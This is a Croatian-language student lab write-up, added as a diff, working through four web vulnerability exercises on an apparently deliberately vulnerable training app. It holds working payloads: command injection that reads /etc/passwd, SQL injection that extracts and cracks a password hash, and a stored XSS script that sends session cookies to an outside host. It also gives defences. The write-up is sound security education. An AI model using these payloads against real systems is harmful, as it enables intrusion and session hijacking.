@@ -1,0 +1,90 @@
+==================== 1. Zadatak ======================
+
+1. Nakon što je 1 | echo sui ispisau sui doznali smo da je moguć injection napad
+
+2. Zatim sam unio 1 | ls / što mi je dalo ispis cijelog root direktorija, među ostalom tu je i etc folder
+
+3. Sljedeći korak bio je unijeti 1 | cat /etc/passwd što nam je dalo ispis cijele passwd datoteke
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+
+==================== 2. Zadatak ======================
+
+1. Unosim ' OR 1=1# kako bi zbog tautologije dobio sve n-torke tablice users, problem je što dobijemo samo First name i Surname
+
+2. Pretpostavka je da query izgleda otpirlike ovako: "SELECT first_name, last_name FROM users WHERE user_id = '$user_input';"
+   i na temelju toga stvaram upit:
+		
+		1' UNION SELECT last_name, password FROM users WHERE first_name = 'Pablo' AND last_name = 'Picasso
+		
+3. Rezulzat unošenja prethodne linije nam daje u ispisu:
+
+ID: 1' UNION SELECT last_name, password FROM users WHERE first_name = 'Pablo' AND last_name = 'Picasso
+First name: admin
+Surname: admin
+ID: 1' UNION SELECT last_name, password FROM users WHERE first_name = 'Pablo' AND last_name = 'Picasso
+First name: Picasso
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+   odakle znamo da je 0d107d09f5bbe40cade3de5c71e9e9b7 MD5 hash Pablove šifre
+   
+4. Zatim u terminalu na virtualnom stroju izvodimo echo "0d107d09f5bbe40cade3de5c71e9e9b7" > hashes.txt
+
+5. Koristeći online aplikaciju doznajemo da je Pablova lozinka: letmein
+
+==================== 3. Zadatak ======================
+
+1. Testitramo jednostavni primjers unošenjem <script>alert('XSS test');</script> u Message polje
+
+2. Unošenjem <script>alert(document.cookie);</script> dobijemo čitav cookie uključujući i PHPSESSID:
+
+PHPSESSID=48sv8tgfubgtmj29jmpin1ieu4
+
+3. Pošto postoji ograničenje znakova u Message polju potrebno je razlomiti skriptu u vise zapisa baze podataka
+   Redom sam unio sljedeće retke u Message polje
+
+<script>let u1 = "http://public.tel.fer";</script>
+<script>let u2 = ".hr/sui?cookie=";      </script>
+<script>let c = document.cookie;         </script>
+<script>document.location.href=u1+u2+c;  </script>
+
+Prilikom unosa zadnjeg zapisa, svaki put kad se učita stranica će se izvršiti sve navedene naredbe te će nas se preusmjeriti na http://public.tel.fer.hr/sui, a cookie će biti prenesen u obliku paramtera ?cookie=...
+
+4. Od ovakvih napada se možemo zaštititi:
+	- Eliminacijom uzroka, tj. ne uključivati ono što unese korisnik u izlaz aplikacije ili u povratni ispis
+	- Kodirati sve što unese korisnik i izbjeći znakove <, >, {, } , “, ʻ i slične
+	- Napraviti whitelisting onoga što korisnik može unijeti
+	- Dezinficirati unos HTML-a
+	- POST umjesto GET-a
+	- HTTPOnly Cookie-
+	
+	
+==================== 4. Zadatak ======================
+
+1. Napad je moguće izvesti jer prilikom učitavanja datoteke poslužitelj ne provjerava na što točno pokazuje argument ?page=... i bili
+   ta aplikacija uopće trebala moći pristupiti toj datoteci. Ovo se najčešće desi kada programer zaboravi da korisnik može ručno
+   unositi vrijednost parametra u URL i vjeruje da će korisnik samo "kliktati" po stranici
+
+2. Od ovakvog napada moguće se zaštititi:
+	- Provjerom valjanost reference na objekt
+	- Eliminacija referenci, zamjena s privremenim vrijednostima koje se na poslužitelju preslikavaju u prave
